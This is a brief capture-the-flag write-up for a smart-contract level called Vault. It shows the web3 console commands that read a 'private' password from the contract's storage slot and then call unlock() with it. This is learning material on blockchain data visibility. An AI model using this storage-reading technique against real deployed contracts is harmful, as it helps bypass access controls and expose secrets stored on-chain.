### Goals

Unlock the vault

### Exploit

To crack this level we need to call `Vault::unlock(bytes32)` with correct bytes. How can we know the secret password? It's saved in Vault storage, the variable is marked as private but on blockchain nothing is private.

### Code

In developer tools we will read the password by reading Vault storage

```code
await web3.eth.getStorageAt(contract.address, 1);
> '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```

Now we now password, we just need to call `unlock` function

```code
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

Done!
